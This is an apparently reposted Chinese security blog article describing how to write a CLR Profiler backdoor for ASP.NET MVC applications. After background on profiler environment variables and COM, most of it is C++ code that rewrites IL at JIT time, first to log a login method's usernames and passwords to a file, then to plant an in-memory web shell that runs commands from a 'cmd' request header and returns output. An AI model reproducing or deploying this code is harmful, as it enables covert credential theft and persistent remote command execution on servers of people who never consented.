# 编写插桩ASP.NET MVC程序的CLR Profiler后门

阅读量 **137291**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-10-25 10:00:16

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t014d626956ad769e4d.jpg)

## 前言

在之前某次渗透测试中，发现一个ASP.NET的站点，通过数据库权限提权拿下系统之后发现站点的密码是经过几次编码和不可逆加密算法存储的。导致无法通过管理员的账号密码登录系统（因为当时是个比较重要的系统，因此需要账号密码来登录后台），因此最后的解决办法就是通过加密算法生成一个新的密码，再写入数据库中来登录。但之后接触到了CLR
Profiler，于是想起用这种方式来获取管理员的账号密码，本次文章仅介绍思路以供研究学习，切勿用于非法用途。

## CLR Profiler探测器介绍

微软在托管进程启动前会检测是否有设置相应的CLR Profiler
API，该API是用于分析运行时进程的上下文情况，在此处我们可以用这种方式来织入我们的恶意代码到其中。当托管进程（应用程序或服务）启动时，将加载公共语言运行时
(CLR)。 初始化 CLR 时，将评估以下两个环境变量以决定进程是否应连接到探查器：

  * COR_ENABLE_PROFILING：仅当此环境变量存在并设置为 1 时，CLR 连接到探查器。
  * COR_PROFILER：如果 COR_ENABLE_PROFILING 检查通过，CLR 将连接到具有此 CLSID 或 ProgID 的探查器（已事先存储在注册表中）。 COR_PROFILER 环境变量被定义为字符串，如以下两个示例中所示。 
    
        set COR_PROFILER={32E2F4DA-1BEA-47ea-88F9-C5DAF691C94A}
    set COR_PROFILER="MyProfiler"
    

下图显示探查器 DLL 如何与所分析应用程序和 CLR 交互。  

###  关于ICorProfilerCallback

CLR 在 ICorProfilerCallback (或 ICorProfilerCallback2)
接口中调用方法，以便在探查器已订阅的事件发生时，来通知探查器。 这是 CLR 与探查器进行通信时所使用的主回调接口。  
探查器必须实现接口的方法 ICorProfilerCallback 。 对于 .NET Framework 版本2.0 或更高版本，探查器还必须实现
ICorProfilerCallback2 方法。 每个方法实现都必须返回值为 “S_OK” 的 HRESULT，否则失败时 E_FAIL。

###  关于通知接口

可以将ICorProfilerCallback和ICorProfilerCallback2视为通知接口。 这些接口包括
ClassLoadStarted、ClassLoadFinished和 JITCompilationStarted等方法。 每次 CLR
进行加载或卸载类、编译函数等操作时，都会调用探查器的 ICorProfilerCallback 或 ICorProfilerCallback2
接口中的相应方法。

###  关于信息检索接口

分析中涉及的其他主要界面是 ICorProfilerInfo 和 ICorProfilerInfo2。
探查器根据需要调用这些接口，以获取更多的信息来帮助进行分析。 例如，每当 CLR 调用 FunctionEnter2 函数时，它都会提供函数标识符。
探查器可以通过调用 ICorProfilerInfo2::GetFunctionInfo2 方法来获取有关该函数的详细信息，以发现该函数的父类、名称，等等。

###  初始化探查器

探查器创建最重要的就是ICorProfilerCallback::Initialize
方法，这是CLR应用程序启动时初始化代码探查器的入口。如果两次环境变量检查均通过，CLR 就会以与 COM CoCreateInstance
函数类似的方式创建探查器实例。

    
    
    HRESULT Initialize(
        [in] IUnknown *pICorProfilerInfoUnk
    );
    

pICorProfilerInfoUnk 中指向 IUnknown 接口的指针，探查器必须查询该接口的 ICorProfilerInfo 接口指针。  
IUnknown 是每个其他 COM 接口的基接口。 此接口定义三种方法： QueryInterface、 AddRef和Release。
QueryInterface 允许接口用户要求对象指向其接口的另一个接口。 AddRef 和 Release 在接口上实现引用计数。  
因此必须要在Initialize方法中通过QueryInterface查询，并通过”ICorProfilerInfo”或”ICorProfilerInfo2”接口指针保存它。  
探查器将注册一个 COM 对象。 如果探查器面向 .NET Framework 版本1.0 或1.1，则该 COM 对象只需实现的方法
ICorProfilerCallback 。 如果目标 .NET Framework 版本2.0 或更高版本，则 COM 对象还必须实现的方法
ICorProfilerCallback2。

* * *

得到”ICorProfilerInfo”或”ICorProfilerInfo2”接口指针之后，就需要通过ICorProfilerInfo::SetEventMask方法来设置事件通知的类别。

    
    
    ICorProfilerInfo* pInfo;
    pICorProfilerInfoUnk->QueryInterface(IID_ICorProfilerInfo, (void**)&pInfo);
    pInfo->SetEventMask(COR_PRF_MONITOR_ENTERLEAVE | COR_PRF_MONITOR_GC);
    

这只能执行一次，并且只能在 Initialize 方法内部执行。稍后从其他函数调用它会导致错误。

注：这些事件的类别可以从[https://docs.microsoft.com/zh-cn/dotnet/framework/unmanaged-api/profiling/cor-prf-monitor-enumeration得到。](https://docs.microsoft.com/zh-cn/dotnet/framework/unmanaged-api/profiling/cor-prf-monitor-enumeration%E5%BE%97%E5%88%B0%E3%80%82)

## COM编程基础

为了方便读者理解CLR Profiler的编写过程，这里再参杂一些COM编程的基础，方便让读者知道为什么代码需要这么写，但如果你是大神，请跳过这一章节。

所有的COM接口都继承了IUnknown，每个接口的vtbl中的前三个函数都是QueryInterface、AddRef、Release。这样所有COM接口都可以被当成IUnknown接口来处理。

    
    
    interface IUnknown
    {
        virtual HRESULT __stdcall QueryInterface(const IID& iid, void** ppv) = 0;
        virtual ULONG __stdcall AddRef() = 0;
        virtual ULONG __stdcall Release() = 0;
    };
    

IUnknown中包含一个名称为QueryInterface的成员函数，客户可以通过此函数来查询某组件是否支持某个特定的接口。若支持，QueryInterface函数将返回一个指向此接口的指针，否则，返回值将是一个错误代码。

第一个参数客户欲查询的接口的标识符。一个标识所需接口的常量  
第二个参数是存放所请求接口指针的地址  
返回值是一个HRESULT值。查询成功返回S_OK，如果不成功则返回相应错误码。

然后再来熟悉几个COM调用过程中常见的对象：

**（1）CoCreateInstance**

> Creates and default-initializes a single object of the class associated with
> a specified CLSID.

其实他封装了如下功能：

    
    
    CoCreateInstance(....){
    　　　　//.......
    　　　　IClassFactory *pClassFactory=NULL;
    　　　　CoGetClassObject(CLSID_Object, CLSCTX_INPROC_SERVER, NULL, IID_IClassFactory, (void **)&pClassFactory);
    　　　　pClassFactory->CreateInstance(NULL, IID_IUnknown, (void**)&pUnk);
    　　　　pClassFactory->Release();
    　　　　//........
    }
    

**（2）CoGetClassObject**  
将在注册表中查找指定的组件。找到之后，它将装载实现此组件的DLL，装载成功之后，它将调用在DLL服务器中实现的DllGetClassObject。

**（3）DllGetClassObject**

> Retrieves the class object from a DLL object handler or object application.

我们之后会在这里创建对应的IClassFactory的类工厂，并通过QueryInterface查询其IClassFactory接口实例，并将其返回给CoCreateInstance。

**（4）IClassFactory**

> Enables a class of objects to be created.

通过DllGetClassObject函数获取到指向类对象的IClassFactory接口指针后，再调用此接口实现的IClassFactory::CreateInstance函数来创建指定的组件对象。

**（5）IClassFactory::CreateInstance**  
IClassFactory::CreateInstance调用了new操作符来创建指定的组件，并查询组件的IX接口。

    
    
    HRESULT STDMETHODCALLTYPE ClassFactory::CreateInstance(IUnknown *pUnkOuter, REFIID riid, void **ppvObject)
    {
        if (pUnkOuter != nullptr)
        {
            *ppvObject = nullptr;
            return CLASS_E_NOAGGREGATION;
        }
    
        CorProfiler* profiler = new CorProfiler();        //实现的组件
        if (profiler == nullptr)
        {
            return E_FAIL;
        }
    
        return profiler->QueryInterface(riid, ppvObject);
    }
    
    HRESULT STDMETHODCALLTYPE ClassFactory::LockServer(BOOL fLock)
    {
        return S_OK;
    }
    

这里我找到网上一张图片来解释该步骤

![](https://p0.ssl.qhimg.com/t01d7f67d42353f3533.png)

详细调用过程为：  
//客户调用COM流程：

    
    
    CoCreateInstace(rclsid,NULL,dwClsContext,IID_IX,(void**)&pIX); //IX* pIX
    　　|--> CoGetClassObject(rclsid, dwClsContext, NULL, IID_IClassFactory, &pCF) //IClassFactory* pCF
    　　　　|--> DllGetClassObject(rclsid,IID_IClassFactory,&pCF)
    　　　　　　|--> CFactory* pFactory = new CFactory();
    　　　　　　|--> pFactory->QueryInterface(IID_IClassFactory,&pCF); //返回类场指针IClassFactory* pCF
    　　|--> pCF->CreateInstance(pUnkOuter, IID_IX, &pIX); //IX* pIX 组件接口指针pIX
    pIX->Fx();
    

## 通知探查器开始JIT编译

通知探查器开始JIT编译就需要用到ICorProfilerCallback::JITCompilationStarted方法。

    
    
    HRESULT JITCompilationStarted(
        [in] FunctionID functionId,
        [in] BOOL fIsSafeToBlock
    );
    

functionId是要开始织入的目标函数ID；

fIsSafeToBlock是指示探查器是否会影响运行时的操作的值。

当 IL 代码即将被 JIT 转换为本机代码时，所有托管方法都会调用该回调。这是我们进行一些 IL 重写的机会。

我们从 JITCompilationStarted 回调中得到的是一个 FunctionID。通过使用 FunctionID
作为参数，ICorProfilerInfo::GetFunctionInfo可以获得它的ClassID和ModuleID。  
ICorProfilerInfo::GetModuleInfo使用ModuleID将返回其Module名称和其AssemblyID。  
GetTokenAndMetadataFromFunction函数的第三个参数可以设置成IMetaDataImport对象，此接口用于在元数据中进行查找。例如，可以遍历一个类的所有方法，或者找到一个类的父类或接口。

例如如下示例：

    
    
    mdTypeDef classTypeDef;
    WCHAR functionName[MAX_LENGTH];
    WCHAR className[MAX_LENGTH];
    PCCOR_SIGNATURE signatureBlob;
    ULONG signatureBlobLength;
    DWORD methodAttributes = 0;
    Check(metaDataImport->GetMethodProps(token1, &classTypeDef, functionName, MAX_LENGTH, 0, &methodAttributes, &signatureBlob, &signatureBlobLength, NULL, NULL));
    Check(metaDataImport->GetTypeDefProps(classTypeDef, className, MAX_LENGTH, 0, NULL, NULL));
    metaDataImport->Release();
    

上述执行完成后就能获取当前触发JITCompilationStarted的函数名称和类名。

## 编写获取ASP.NET程序登录时的账号密码

至此，本文的前章铺叙都已经做好了，下面请系好安全带开始发车~

之前已经介绍了基础知识，现在就开始编写对应的织入程序。  
首先就是Profiler的初始化函数

    
    
    RESULT STDMETHODCALLTYPE CorProfiler::Initialize(IUnknown *pICorProfilerInfoUnk)
    {
        HRESULT queryInterfaceResult = pICorProfilerInfoUnk->QueryInterface(__uuidof(ICorProfilerInfo7), reinterpret_cast<void **>(&this->corProfilerInfo));
    
        if (FAILED(queryInterfaceResult))
        {
            return E_FAIL;
        }
    
        DWORD eventMask = COR_PRF_MONITOR_JIT_COMPILATION                      |
                          COR_PRF_DISABLE_TRANSPARENCY_CHECKS_UNDER_FULL_TRUST | /* helps the case where this profiler is used on Full CLR */
                          COR_PRF_DISABLE_INLINING                             ;
    
        auto hr = this->corProfilerInfo->SetEventMask(eventMask);
    
        return S_OK;
    }
    

这块就是根据微软官方文档所述

> pICorProfilerInfoUnk 中指向 IUnknown 接口的指针，探查器必须查询该接口的 ICorProfilerInfo 接口指针。  
>
> 得到”ICorProfilerInfo”或”ICorProfilerInfo2”接口指针之后，就需要通过ICorProfilerInfo::SetEventMask方法来设置事件通知的类别。

之后就看到我们的主角ICorProfilerCallback::JITCompilationStarted函数的实现

    
    
    HRESULT STDMETHODCALLTYPE CorProfiler::JITCompilationStarted(FunctionID functionId, BOOL fIsSafeToBlock)
    {
        HRESULT hr;
        mdToken token;
        ClassID classId;
        ModuleID moduleId;
    
        IfFailRet(this->corProfilerInfo->GetFunctionInfo(functionId, &classId, &moduleId, &token));
    
        if (!CheckProcessName(this->corProfilerInfo, moduleId)) {
            return S_OK;
        }
    
        CComPtr<IMetaDataImport> metadataImport;
        IfFailRet(this->corProfilerInfo->GetModuleMetaData(moduleId, ofRead | ofWrite, IID_IMetaDataImport, reinterpret_cast<IUnknown **>(&metadataImport)));
    
        CComPtr<IMetaDataEmit> metadataEmit;
        IfFailRet(metadataImport->QueryInterface(IID_IMetaDataEmit, reinterpret_cast<void **>(&metadataEmit)));
    
        mdSignature enterLeaveMethodSignatureToken;
        metadataEmit->GetTokenFromSig(enterLeaveMethodSignature, sizeof(enterLeaveMethodSignature), &enterLeaveMethodSignatureToken);
    
        IMetaDataImport* metaDataImport = NULL;
        mdToken token1 = NULL;
        IfFailRet(this->corProfilerInfo->GetTokenAndMetaDataFromFunction(functionId, IID_IMetaDataImport, (LPUNKNOWN *)&metaDataImport, &token1));
        const int MAX_LENGTH = 1024;
    
        mdTypeDef classTypeDef;
        WCHAR functionName[MAX_LENGTH];
        WCHAR className[MAX_LENGTH];
        PCCOR_SIGNATURE signatureBlob;
        ULONG signatureBlobLength;
        DWORD methodAttributes = 0;
        IfFailRet(metaDataImport->GetMethodProps(token1, &classTypeDef, functionName, MAX_LENGTH, 0, &methodAttributes, &signatureBlob, &signatureBlobLength, NULL, NULL));
        IfFailRet(metaDataImport->GetTypeDefProps(classTypeDef, className, MAX_LENGTH, 0, NULL, NULL));
        metaDataImport->Release();
    
        WCHAR wcs[MAX_LENGTH * 2];
        wcscpy(wcs, className);
        wcscat(wcs, L".");
        wcscat(wcs, functionName);
        if (wcscmp(L"WebApplication1.Controllers.HelloController.Login", wcs) == 0) {
            return RewriteIL(this->corProfilerInfo, nullptr, moduleId, token, functionId, reinterpret_cast<ULONGLONG>(EnterMethodAddress), reinterpret_cast<ULONGLONG>(LeaveMethodAddress), enterLeaveMethodSignatureToken);
        }
        else {
            return S_OK;
        }
    }
    

函数刚开始的时候通过GetFunctionInfo函数获取到了对应的ModuleID，并通过CheckProcessName函数进行验证。

    
    
    bool CheckProcessName(ICorProfilerInfo7* corProfilerInfo, ModuleID moduleId) {
        const int MAX_LENGTH = 1024;
        WCHAR moduleName[MAX_LENGTH];
        AssemblyID assemblyID;
        AppDomainID appId;
        ULONG buffSize = 0;
        ProcessID processId;
        char szOutBuf[MAX_PATH] = { 0 };
        GetEnvironmentVariable(_T("GODWIND_PROFILER_PROCESSES"), szOutBuf, MAX_PATH - 1);
        WCHAR processName[MAX_LENGTH];
    
        mbstowcs(processName, szOutBuf, sizeof(szOutBuf) - 1);      //char to wchar_t
    
        Check(corProfilerInfo->GetModuleInfo(moduleId, NULL, MAX_LENGTH, 0, moduleName, &assemblyID));
    
        WCHAR assemblyName[MAX_LENGTH];
        Check(corProfilerInfo->GetAssemblyInfo(assemblyID, MAX_LENGTH, 0, assemblyName, &appId, NULL));
    
        Check(corProfilerInfo->GetAppDomainInfo(appId, 0, &buffSize, NULL, NULL));
        WCHAR szName[MAX_LENGTH];
        Check(corProfilerInfo->GetAppDomainInfo(appId, buffSize, &buffSize, szName, &processId));
        if(wcscmp(szName, processName) == 0){
            return true;
        }
        else {
            return false;
        }
    }
    

该函数的具体内容就是获取系统环境变量GODWIND_PROFILER_PROCESSES的值，并通过GetAppDomainInfo返回的szName目标程序进程名和GODWIND_PROFILER_PROCESSES的值比较。如果相等就执行之后的步骤，否则就返回S_OK标志。  
再往之后看：

    
    
    mdTypeDef classTypeDef;
    WCHAR functionName[MAX_LENGTH];
    WCHAR className[MAX_LENGTH];
    PCCOR_SIGNATURE signatureBlob;
    ULONG signatureBlobLength;
    DWORD methodAttributes = 0;
    IfFailRet(metaDataImport->GetMethodProps(token1, &classTypeDef, functionName, MAX_LENGTH, 0, &methodAttributes, &signatureBlob, &signatureBlobLength, NULL, NULL));
    IfFailRet(metaDataImport->GetTypeDefProps(classTypeDef, className, MAX_LENGTH, 0, NULL, NULL));
    metaDataImport->Release();
    
    WCHAR wcs[MAX_LENGTH * 2];
    wcscpy(wcs, className);
    wcscat(wcs, L".");
    wcscat(wcs, functionName);
    if (wcscmp(L"WebApplication1.Controllers.HelloController.Login", wcs) == 0) {
        return RewriteIL(this->corProfilerInfo, nullptr, moduleId, token, functionId, reinterpret_cast<ULONGLONG>(EnterMethodAddress), reinterpret_cast<ULONGLONG>(LeaveMethodAddress), enterLeaveMethodSignatureToken);
    }
    else {
        return S_OK;
    }
    

之前说到过GetMethodProps这种方式可以获取当前JIT加载的函数的名称和对应的类名，我这里讲两个字符串拼接完成之后与L”WebApplication1.Controllers.HelloController.Login”比较。

如果相等，就说明当前的functionID对应的就是我们需要织入的WebApplication1.Controllers.HelloController.Login函数。

然后带入到RewriteIL函数中进行IL字节码操作，这里织入的对象是我自己写的一个函数。

    
    
    static void STDMETHODCALLTYPE Leave(char* arg0)
    {
        FILE *fp = NULL;
        fp = fopen("E:\\GetRequstInfo.txt", "a+");
        fprintf(fp, "\r\narg0: %s  \r\n", arg0);
        fclose(fp);
    }
    
    COR_SIGNATURE enterLeaveMethodSignature[] = { IMAGE_CEE_CS_CALLCONV_STDCALL, 0x01, ELEMENT_TYPE_VOID, ELEMENT_TYPE_STRING };
    
    void(STDMETHODCALLTYPE *LeaveMethodAddress)(char*) = &Leave;
    

这里我需要重点说一下enterLeaveMethodSignature数组，这个数组是对你织入的函数的描述，在之后的织入中必不可少

第一个值是他的调用方式stdcall  
第二个值代表他有多少个参数，这里只有一个char* arg0参数，所以数值是1  
第三个值代表返回void类型  
第四个值就是参数类型，这里是String的类型，如果第二个值是2，则数组的第五个值也得写上对应的参数类型，但是我们没有两个参数，因此数组只有四个值。

最后通过IMetaDataEmit::GetTokenFromSig函数获取对应元数据签名

关于数组里的这些值该如何设置，可以从微软的官网上找到：<https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/metadata/corelementtype-enumeration>

因此之后带入RewriteIL中的LeaveMethodAddress就是我要织入的函数，跟进函数查看：

    
    
    HRESULT RewriteIL(
        ICorProfilerInfo * pICorProfilerInfo,
        ICorProfilerFunctionControl * pICorProfilerFunctionControl,
        ModuleID moduleID,
        mdMethodDef methodDef,
        FunctionID functionId,
        UINT_PTR enterMethodAddress,
        UINT_PTR exitMethodAddress,
        ULONG32 methodSignature)
    {
        ILRewriter rewriter(pICorProfilerInfo, pICorProfilerFunctionControl, moduleID, methodDef);
    
        IMetaDataImport* metaDataImport = NULL;
        mdToken token1 = NULL;
        IfFailRet(pICorProfilerInfo->GetTokenAndMetaDataFromFunction(functionId, IID_IMetaDataImport, (LPUNKNOWN *)&metaDataImport, &token1));
    
        IfFailRet(rewriter.Import());
        {
            IfFailRet(AddExitProbe(metaDataImport, &rewriter, functionId, exitMethodAddress, methodSignature));
        }
        IfFailRet(rewriter.Export());
    
        return S_OK;
    }
    

获取到对应的metaDataImport对象后，带入到AddExitProbe函数，之后就是操作IL织入代码的地方，在这之前先来看看我们要织入的程序代码是什么样子的。  
源C#代码：

![](https://p0.ssl.qhimg.com/t013373baa50b4acb5e.png)

中间语言IL代码：

![](https://p5.ssl.qhimg.com/t017458a06258d191fb.png)

所以我织入的思路就是在IL_0016和IL_0017之间织入如下代码：

    
    
    ldloc.0
    ldc.i4 num        //function address
    calli
    nop
    

如此一来，刚才IL_0016上的stloc.0的返回值继续压栈成参数并调用我们的函数，就能够完成我们获取目标传参的内容，所以之前的AddExitProbe函数的实现如下：

    
    
    HRESULT AddExitProbe(
        IMetaDataImport* metaDataImport,
        ILRewriter * pilr,
        FunctionID functionId,
        UINT_PTR methodAddress,
        ULONG32 methodSignature)
    {
        HRESULT hr;
        BOOL fAtLeastOneProbeAdded = FALSE;
    
        // Find all RETs, and insert a call to the exit probe before each one.
        for (ILInstr * pInstr = pilr->GetILList()->m_pNext; pInstr != pilr->GetILList(); pInstr = pInstr->m_pNext)
        {
            switch (pInstr->m_opcode)
            {
            case CEE_CALLVIRT:{
    
                const int MAX_LENGTH = 1024;
                WCHAR szString[MAX_LENGTH];
                ULONG *pchString = 0;
    
                if (pInstr->m_Arg64 == 167772219) {     //0xa00003b     string [System]System.Collections.Specialized.NameValueCollection::get_Item(string)
    
                    IfFailRet(metaDataImport->GetUserString((mdString)pInstr->m_pPrev->m_Arg64, szString, MAX_LENGTH, pchString));
    
    
                    pInstr = pInstr->m_pNext;
                    pilr->GetILList();
                    pInstr = pInstr->m_pNext;
                    pilr->GetILList();
    
                    ILInstr * pNewInstr = pilr->NewILInstr();
    
                    pNewInstr = pilr->NewILInstr();
    
                    if(wcsstr(szString,L"username")){
                        pNewInstr->m_opcode = CEE_LDLOC_0;        //ldloc.0
                    }
                    else if (wcsstr(szString, L"password")) {
                        pNewInstr->m_opcode = CEE_LDLOC_1;        //ldloc.1
                    }
                    else {
                        return S_OK;
                    }
    
                    pilr->InsertBefore(pInstr, pNewInstr);
    
                    constexpr auto CEE_LDC_I = sizeof(size_t) == 8 ? CEE_LDC_I8 : sizeof(size_t) == 4 ? CEE_LDC_I4 : throw std::logic_error("size_t must be defined as 8 or 4");
    
                    pNewInstr = pilr->NewILInstr();
                    pNewInstr->m_opcode = CEE_LDC_I;        //push function address
                    pNewInstr->m_Arg64 = methodAddress;
                    pilr->InsertBefore(pInstr, pNewInstr);
    
                    pNewInstr = pilr->NewILInstr();
                    pNewInstr->m_opcode = CEE_CALLI;        //calli
                    pNewInstr->m_Arg32 = methodSignature;
                    pilr->InsertBefore(pInstr, pNewInstr);
    
                    pNewInstr = pilr->NewILInstr();
                    pNewInstr->m_opcode = CEE_NOP;        //nop
                    pilr->InsertBefore(pInstr, pNewInstr);
    
    
                    fAtLeastOneProbeAdded = TRUE;
                }
    
                break;
            }
    
            default:
                break;
            }
        }
    
        if (!fAtLeastOneProbeAdded)
            return E_FAIL;
    
        return S_OK;
    }
    

其中pInstr->m_Arg64 == 167772219的167772219值是提前遍历过一遍才知道该函数对应的MethodToken。  
同时，因为我是要织入在IL_0017前面，这个指针相当于我switch-case中设定的callvirt的偏移后两个节点，因此需要在代码中调用两次pInstr = pInstr->m_pNext;

## 针对ASP.NET MVC的内存马编写

编写内存马的时候爬坑也挺久的，请教了公司研发部的同事，最后经过多次调试之后总算把demo做出来了。因为国内外针对这方面的文档确实很少，之能靠自己一步步调试和定位错误原因，不过好在最终还是达到了预期的目标。

源代码还是跟获取账号密码的代码一样，这次我直接织入到一个Controller的方法中，并获取Headers头的cmd参数，执行命令之后返回到Response上。

首先第一件事就是获取所需要调用的函数的程序集引用

    
    
    ASSEMBLYMETADATA assemblyMetadata = { 0 };
        assemblyMetadata.usMajorVersion = 4;
        assemblyMetadata.usMinorVersion = 0;
        assemblyMetadata.usBuildNumber = 0;
        assemblyMetadata.usRevisionNumber = 0;
        BYTE WebpublicKey[] = { 0xb0, 0x3f, 0x5f, 0x7f, 0x11, 0xd5, 0x0a, 0x3a };      //b03f5f7f11d50a3a
        mdAssemblyRef mscorlibAssemblyRef;
        IMetaDataAssemblyEmit* metaDataAssemblyEmit = NULL;
        IfFailRet(metaDataEmit->QueryInterface(IID_IMetaDataAssemblyEmit, (void**)&metaDataAssemblyEmit));
        IfFailRet(metaDataAssemblyEmit->DefineAssemblyRef(
            WebpublicKey,
            sizeof(WebpublicKey),
            L"System.Web",
            &assemblyMetadata,
            nullptr,
            0,
            0,
            &mscorlibAssemblyRef));
    
        ASSEMBLYMETADATA assemblyMetadata1 = { 0 };
        assemblyMetadata1.usMajorVersion = 4;
        assemblyMetadata1.usMinorVersion = 0;
        assemblyMetadata1.usBuildNumber = 0;
        assemblyMetadata1.usRevisionNumber = 0;
        BYTE SystempublicKey[] = { 0xb7, 0x7a, 0x5c, 0x56, 0x19, 0x34, 0xe0, 0x89 };      //b77a5c561934e089
        mdAssemblyRef mscorlibAssemblyRef2;
        IfFailRet(metaDataEmit->QueryInterface(IID_IMetaDataAssemblyEmit, (void**)&metaDataAssemblyEmit));
        IfFailRet(metaDataAssemblyEmit->DefineAssemblyRef(
            SystempublicKey,
            sizeof(SystempublicKey),
            L"System",
            &assemblyMetadata1,
            nullptr,
            0,
            0,
            &mscorlibAssemblyRef2));
    
        BYTE rSig[] = { IMAGE_CEE_CS_CALLCONV_HASTHIS,
                   0, // Number of parameters 
                   ELEMENT_TYPE_CLASS, 0, 0, 0, 0, // Return value
                   0 // parameter list must end with 0
        };
    
        ASSEMBLYMETADATA Mvcassembly = { 0 };
        Mvcassembly.usMajorVersion = 5;
        Mvcassembly.usMinorVersion = 2;
        Mvcassembly.usBuildNumber = 4;
        Mvcassembly.usRevisionNumber = 0;
        BYTE publicKey[] = { 0x31, 0xbf, 0x38, 0x56, 0xad, 0x36, 0x4e, 0x35 };      //31bf3856ad364e35
        BYTE MVCrSig[] = { IMAGE_CEE_CS_CALLCONV_HASTHIS,
                   0, // Number of parameters 
                   ELEMENT_TYPE_CLASS, 0, 0, 0, 0, // Return Class
                   0 // parameter list must end with 0
        };
        mdAssemblyRef MvcmscorlibAssemblyRef;
        IfFailRet(metaDataAssemblyEmit->DefineAssemblyRef(
            publicKey,
            sizeof(publicKey),
            L"System.Web.Mvc",
            &Mvcassembly,
            nullptr,
            0,
            0,
            &MvcmscorlibAssemblyRef));
    

有了这些引用之后就可以重写对应的IL，并调用对应的函数获取返回值  
因为我需要将Headers头中的参数传入到对应的cmd执行函数里面去，所以伪代码大致如下：

    
    
    Response.Write(EnterExecCMD(Request.Headers["cmd"]))
    

其对应的IL代码如下：

    
    
    IL_00c2: ldarg.0
    IL_00c3: call instance class [System.Web]System.Web.HttpResponseBase [System.Web.Mvc]System.Web.Mvc.Controller::get_Response()
    IL_00c8: ldarg.0
    IL_00c9: call instance class [System.Web]System.Web.HttpRequestBase [System.Web.Mvc]System.Web.Mvc.Controller::get_Request()
    IL_00ce: callvirt instance class [System]System.Collections.Specialized.NameValueCollection [System.Web]System.Web.HttpRequestBase::get_Headers()
    IL_00d3: ldstr "cmd"
    IL_00d8: callvirt instance string [System]System.Collections.Specialized.NameValueCollection::get_Item(string)
    //此处是调用EnterExecCMD函数的地方
    IL_00dd: callvirt instance void [System.Web]System.Web.HttpResponseBase::Write(string)
    

所以关键代码重写之后的IL代码如下：

    
    
    pNewInstr = pilr->NewILInstr();
    pNewInstr->m_opcode = CEE_NOP;
    pilr->InsertBefore(pInsertProbeBeforeThisInstr, pNewInstr);
    
    pNewInstr = pilr->NewILInstr();
    pNewInstr->m_opcode = CEE_LDARG_0;
    pilr->InsertBefore(pInsertProbeBeforeThisInstr, pNewInstr);
    
    mdTypeRef retType;
    IfFailRet(metaDataEmit->DefineTypeRefByName(mscorlibAssemblyRef, L"System.Web.HttpResponseBase", &retType));
    
    IfFailRet(metaDataEmit->DefineTypeRefByName(MvcmscorlibAssemblyRef, L"System.Web.Mvc.Controller", &typeRef));
    ulTokenLength = CorSigCompressToken(retType, &MVCrSig[3]);
    ulSigLength = 3 + ulTokenLength;
    IfFailRet(metaDataEmit->DefineMemberRef(typeRef, L"get_Response", MVCrSig, ulSigLength, &MemberRef));
    
    pNewInstr = pilr->NewILInstr();
    pNewInstr->m_opcode = CEE_CALL;
    pNewInstr->m_Arg32 = MemberRef;
    pilr->InsertBefore(pInsertProbeBeforeThisInstr, pNewInstr);
    
    pNewInstr = pilr->NewILInstr();
    pNewInstr->m_opcode = CEE_LDARG_0;
    pilr->InsertBefore(pInsertProbeBeforeThisInstr, pNewInstr);
    
    IfFailRet(metaDataEmit->DefineTypeRefByName(mscorlibAssemblyRef, L"System.Web.HttpRequestBase", &retType));
    
    IfFailRet(metaDataEmit->DefineTypeRefByName(MvcmscorlibAssemblyRef, L"System.Web.Mvc.Controller", &typeRef));
    ulTokenLength = CorSigCompressToken(retType, &MVCrSig[3]);
    ulSigLength = 3 + ulTokenLength;
    IfFailRet(metaDataEmit->DefineMemberRef(typeRef, L"get_Request", MVCrSig, ulSigLength, &MemberRef));
    
    pNewInstr = pilr->NewILInstr();
    pNewInstr->m_opcode = CEE_CALL;
    pNewInstr->m_Arg32 = MemberRef;
    pilr->InsertBefore(pInsertProbeBeforeThisInstr, pNewInstr);
    IfFailRet(metaDataEmit->DefineTypeRefByName(mscorlibAssemblyRef2, L"System.Collections.Specialized.NameValueCollection", &retType));
    
    mdTypeRef typeRef1 = mdTypeRefNil;
    mdMemberRef MemberRef1 = mdMemberRefNil;
    IfFailRet(metaDataEmit->DefineTypeRefByName(mscorlibAssemblyRef, L"System.Web.HttpRequestBase", &typeRef1));
    ulTokenLength = CorSigCompressToken(retType, &rSig[3]);
    ulSigLength = 3 + ulTokenLength;
    IfFailRet(metaDataEmit->DefineMemberRef(typeRef1, L"get_Headers", rSig, ulSigLength, &MemberRef1));
    
    pNewInstr = pilr->NewILInstr();
    pNewInstr->m_opcode = CEE_CALLVIRT;
    pNewInstr->m_Arg32 = MemberRef1;
    pilr->InsertBefore(pInsertProbeBeforeThisInstr, pNewInstr);
    
    auto localstring = L"cmd";
    auto localsize = lstrlenW(localstring);
    mdToken stringToken;
    IfFailRet(metaDataEmit->DefineUserString(localstring, localsize, &stringToken));
    
    pNewInstr = pilr->NewILInstr();
    pNewInstr->m_opcode = CEE_LDSTR;
    pNewInstr->m_Arg32 = stringToken;       //"cmd"
    pilr->InsertBefore(pInsertProbeBeforeThisInstr, pNewInstr);
    
    
    
    BYTE rSig_Item[] = { IMAGE_CEE_CS_CALLCONV_HASTHIS, 0x01, ELEMENT_TYPE_STRING, ELEMENT_TYPE_STRING };
    
    mdTypeRef typeRef2 = mdTypeRefNil;
    mdMemberRef MemberRef2 = mdMemberRefNil;
    IfFailRet(metaDataEmit->DefineTypeRefByName(mscorlibAssemblyRef2, L"System.Collections.Specialized.NameValueCollection", &typeRef2));
    IfFailRet(metaDataEmit->DefineMemberRef(typeRef2, L"get_Item", rSig_Item, sizeof(rSig_Item), &MemberRef2));
    
    pNewInstr = pilr->NewILInstr();
    pNewInstr->m_opcode = CEE_CALLVIRT;
    pNewInstr->m_Arg32 = MemberRef2;
    pilr->InsertBefore(pInsertProbeBeforeThisInstr, pNewInstr);
    
    pNewInstr = pilr->NewILInstr();
    pNewInstr->m_opcode = CEE_LDC_I;
    pNewInstr->m_Arg64 = methodAddress;
    pilr->InsertBefore(pInsertProbeBeforeThisInstr, pNewInstr);
    
    pNewInstr = pilr->NewILInstr();
    pNewInstr->m_opcode = CEE_CALLI;
    pNewInstr->m_Arg32 = methodSignature;
    pilr->InsertBefore(pInsertProbeBeforeThisInstr, pNewInstr);
    
    BYTE rSig_Write[] = { IMAGE_CEE_CS_CALLCONV_HASTHIS, 0x01, ELEMENT_TYPE_VOID, ELEMENT_TYPE_STRING };
    
    IfFailRet(metaDataEmit->DefineTypeRefByName(mscorlibAssemblyRef, L"System.Web.HttpResponseBase", &typeRef1));
